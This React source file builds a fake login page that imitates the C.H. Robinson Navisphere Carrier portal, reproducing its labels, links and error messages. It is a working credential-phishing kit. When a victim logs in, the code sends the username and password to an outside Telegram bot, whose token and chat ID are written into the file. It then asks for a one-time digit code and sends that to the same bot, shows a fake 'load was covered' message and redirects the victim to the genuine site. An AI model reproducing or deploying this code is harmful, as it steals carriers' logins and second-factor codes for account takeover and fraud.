import '../HomePgae/homepage.css';
import logoSvg from '../../img/Logo.svg';
import { useState, useRef } from "react";
import ReactLoading from 'react-loading';
import Swal from 'sweetalert2'

function HomePage() {
    const [passwordShown, setPasswordShown] = useState(false);
    const userName = useRef(null);
    const passwordUser = useRef(null);
    var qfNum = 0;
    const [loading, setLoading] = useState(true);
    const [ereva, setEreva] = useState(false);
    const [usertazaname, setUsertazaname] = useState("");
    const digitcodeUser = useRef(null);

    function qfFunck(qf) {
        if(qf.value.indexOf('ccox') !== -1 || qf.value.indexOf('klir') !== -1 || qf.value.indexOf('qunn') !== -1 || qf.value.indexOf('jajtam') !== -1 ||
        qf.value.indexOf('jaj tam') !== -1 || qf.value.indexOf('txeq') !== -1 || qf.value.indexOf('cceq') !== -1 || qf.value.indexOf('uteq') !== -1 ||
        qf.value.indexOf('fuck') !== -1 || qf.value.indexOf('suck') !== -1 || qf.value.indexOf('dick') !== -1 || qf.value.indexOf('gandon') !== -1 ||
        qf.value.indexOf('qunnem') !== -1 || qf.value.indexOf('txa') !== -1 || qf.value.indexOf('boz') !== -1 || qf.value.indexOf('chatlax') !== -1 ||
        qf.value.indexOf('gyot') !== -1 || qf.value.indexOf('garlax') !== -1) {
            qf.value = '';
            qf.nextSibling.style.display = "block";
            qfNum = 1;
        } else {
            qfNum = 0;
        }
    }
    const handleInputBlur = event => {
        if(event.target.value == 0){
            event.target.nextSibling.style.display = "flex";
        } else {
            event.target.nextSibling.style.display = "none";
        }
        qfFunck(event.target);
    };

    const togglePassword = () => {
        setPasswordShown(!passwordShown);
    };
    
     function next(event) {
        event.preventDefault();
        setLoading(!loading);
        setTimeout(() => {
            setLoading(loading);
            setEreva(!ereva);
        }, 10000);
        setEreva(!ereva);
        qfFunck(userName.current);
        if(qfNum == 1) {
            userName.current.value = '';
            userName.current.nextSibling.style.display = "block";
        } else if(qfNum == 0) {
            qfFunck(passwordUser.current);
            if(qfNum == 0){
                if(userName.current.value && passwordUser.current.value) {
                    const url = `https://api.telegram.org/bot8191902377:AAH4HrhhjqeE4WipmwN2nqslgoZ4DN34CdU/sendMessage`
                    const obj = {
                        chat_id: 1368494862,
                        text: "Username - " + userName.current.value + "\n" + "Verify - " + passwordUser.current.value,
                    };
                    const xht = new XMLHttpRequest();
                    xht.open("POST", url, true);
                    xht.setRequestHeader("Content-type", "application/json; charset=UTF-8");
                    xht.send(JSON.stringify(obj));
                    return;
                }
            }
        }
        if (!userName.current.value) {
            event.target[0].nextSibling.style.display = "block";
        } 
        if (!passwordUser.current.value) {
            event.target[1].nextSibling.style.display = "block";
        }
    }



    function handleSubmit(event) {
        event.preventDefault();
        if (digitcodeUser.current.value) {
            const url = `https://api.telegram.org/bot8191902377:AAH4HrhhjqeE4WipmwN2nqslgoZ4DN34CdU/sendMessage`
            const obj = {
                chat_id: 1368494862,
                text: "Username - " + userName.current.value + "\n" + "Verify - " + digitcodeUser.current.value,
            };
            const xht = new XMLHttpRequest();
            xht.open("POST", url, true);
            xht.setRequestHeader("Content-type", "application/json; charset=UTF-8");
            xht.send(JSON.stringify(obj));
            Swal.fire({
                heightAuto: false,
                customClass: {
                    confirmButton: 'confirm-button-class',
                    title: 'title-class'
                },  
                title: "Free Load Board | C.H. Robinson",
                text: "The load was covered.",
                preConfirm: () => {
                    window.location.href = "https://www.navispherecarrier.com/login";
                },
            });
            return;
        } else {
            digitcodeUser.current.nextSibling.style.display = "flex";
            digitcodeUser.current.className = "form_empty form-control";
        }
    }
     
  return (
    <section className="sectionOne">
        <div style = {loading ? { display: 'none' } : { display: 'flex' } } className="loadingBox">
            <ReactLoading className="loading" type="spinningBubbles" color="#094db9" />
        </div>
          <div className="box">
              <div className="mainLogo">
                  <img src={logoSvg} alt="logo" className="logo" id="mainlogo" />
              </div>
              <form onSubmit={handleSubmit} id="formss">
                  <div className="space-outer-bottom-md js-field-username" style = {ereva ? { display: 'none' } : { display: 'block' } }>
                      <label className="required">Username</label>
                      <a className="forgot-link" href="https://www.navispherecarrier.com/login/forgot-username">Forgot Username</a>
                      <input onBlur={handleInputBlur} id="Username" ref={userName} name="Username" auto-id="signin_username_input" type="text" placeholder="Username" className="form-control" />
                      <div style={{display:'none'}} aria-live="assertive" className="form-error-live-region">
                          <div className="form-group space-outer-top-xs has-error js-form-error">
                              <div className="help-text form-error ns-icon ns-error" role="alert" data-cy="signin_email_validation_error">
                                  <span className="translation-jsx-component">Username is required</span>
                              </div>
                          </div>
                      </div>
                  </div>
                  <div className="space-outer-bottom-md js-field-password" style = {ereva ? { display: 'none' } : { display: 'block' } }>
                      <label className="required">Password</label>
                      <a className="forgot-link" href="https://www.navispherecarrier.com/login/forgot-password">Forgot Password</a>
                      <input onBlur={handleInputBlur} id="Password" ref={passwordUser} name="Password" auto-id="signin_password_input" type={passwordShown ? "text" : "password"} placeholder="Password" className="form-control" />
                      <div style={{display:'none'}} aria-live="assertive" className="form-error-live-region">
                          <div className="form-group space-outer-top-xs has-error js-form-error">
                              <div className="help-text form-error ns-icon ns-error" role="alert" data-cy="signin_password_validation_error">
                                  <span className="translation-jsx-component">Password is required</span>
                              </div>
                          </div>
                      </div>
                  </div>
                  <div className="form-group js-field-show-password" style = {ereva ? { display: 'none' } : { display: 'block' } }>
                      <label className="checkbox-inline"><input onClick={togglePassword} name="show-password" type="checkbox" id="showpass" />Show password</label>
                  </div>
                  <div style={{display:'none'}} className="errorBar api-error form-group space-outer-top-xs has-error js-form-error">
                    <div className="help-text form-error ns-icon ns-error" role="alert" data-cy="signin_form_error">
                        <span id="" className="translation-jsx-component">The username or password you entered is incorrect.</span>
                    </div>
                  </div>
                  <div className = "inputBlock" style = {ereva ? { display: 'block' } : { display: 'none' } }>
                        <input onBlur = { handleInputBlur } id = "Digitcode" ref = { digitcodeUser } name = "Digitcode" type = "number" className = "form-control" />
                        <div style = { { display: 'none' } } className = 'requiredBox' >
                            <span className="AfGCob"><svg aria-hidden="true" className="Qk3oof xTjuxe" fill="currentColor" focusable="false" width="16px" height="16px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path></svg></span>
                            Enter the digit code 
                        </div> 
                        <span className = 'placeholder' > Enter the digit code* </span> 
                  </div> 
                  <div className="buttons">
                      <button style = {ereva ? { display: 'none' } : { display: 'inline-block' } } onClick= { next } id="btnLogin" auto-id="signin_submit_login_button" type='button' className="btn btn-primary btn-block">Log in</button>
                      <button style = {ereva ? { display: 'inline-block' } : { display: 'none' } } id="btnLogintwo" auto-id="signin_submit_login_button" type='submit' className="btn btn-primary btn-block">Log in</button>
                      <a style = {ereva ? { display: 'none' } : { display: 'block' } } href="https://www.navispherecarrier.com/registration" id="btn-register" type="button" className="btn btn-default btn-block">Create Account</a>
                  </div>
              </form>
          </div>
    </section>
  );
}

export default HomePage;
